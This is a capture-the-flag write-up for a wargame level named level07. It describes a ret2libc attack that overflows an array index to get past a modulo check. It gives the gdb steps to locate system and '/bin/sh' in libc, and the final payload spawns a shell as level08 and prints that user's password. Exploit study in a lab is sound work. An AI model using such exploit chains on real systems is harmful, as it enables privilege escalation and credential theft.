# level07

We're gonna use the RET2LIBC attack on this one.

We can see that `eip` is located at `0xffffd70c`.  
We know that the buffer starts at `0xffffd544`.
Thus the offset is `0xffffd70c - 0xffffd544` = `456 / 4` = `114`.


We then search `"/bin/sh"` string in the libc.

```sh
(gdb) i proc map
process 2008
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	 0x804b000  0x806c000    0x21000        0x0 [heap]
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
(gdb) p/d 0xf7f897ec
$1 = 4160264172
```


We search for `system`'s address

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p/d 0xf7e6aed0
$2 = 4159090384
```

The last problem we have is a condition on the indexes when storing a number.  
We can't use an `index % 3 == 0`.  
Unfortunately, `114 % 3 == 0`.  


To bypass this, we have to overflow the index to access this address.

```
0xffffffff / 4 + 114 + 1 = 1073741938
```


We can now create the payload :

```sh
$> (printf 'store\n4160264172\n116\nstore\n4159090384\n1073741938\nquit\n'; cat) | ./level07
[...]
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
